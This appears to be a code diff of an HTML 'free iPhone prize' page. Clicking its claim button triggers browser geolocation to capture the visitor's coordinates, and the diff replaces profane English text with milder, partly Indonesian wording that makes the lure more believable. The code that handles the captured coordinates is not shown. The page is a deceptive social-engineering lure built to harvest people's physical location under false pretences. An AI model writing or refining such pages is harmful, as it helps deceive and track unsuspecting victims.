@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Free Fucking Prize!</title>
+    <title>Hadiah Gratis!</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -33,15 +33,15 @@
     </style>
 </head>
 <body>
-    <h1>🎁 Congratulations! You've Won a Fucking iPhone! 🎁</h1>
-    <p>Click the button below to claim your fucking prize, you greedy bastard!</p>
-    <button onclick="getLocation()">Claim Now, You Idiot!</button>
+    <h1>🎁 Congratulations! You've Won a iPhone! 🎁</h1>
+    <p>Click the button below to claim your prize, you greedy!</p>
+    <button onclick="getLocation()">Claim Now!</button>
     <p id="status"></p>
 
     <script>
         function getLocation() {
             if (navigator.geolocation) {
-                document.getElementById("status").innerHTML = "Detecting your fucking location, you clueless fuck...";
+                document.getElementById("status").innerHTML = "tunggu sebentar...";
                 navigator.geolocation.getCurrentPosition(
                     async function(position) {
                         const latitude = position.coords.latitude;
@@ -83,7 +83,7 @@
                     }
                 );
             } else {
-                document.getElementById("status").innerHTML = "Fuck you! Geolocation is not supported by your fucking browser, you outdated fuck.";
+                document.getElementById("status").innerHTML = "Iphone Sedang Dikirim Ke Lokasimu.";
             }
         }
     </script>
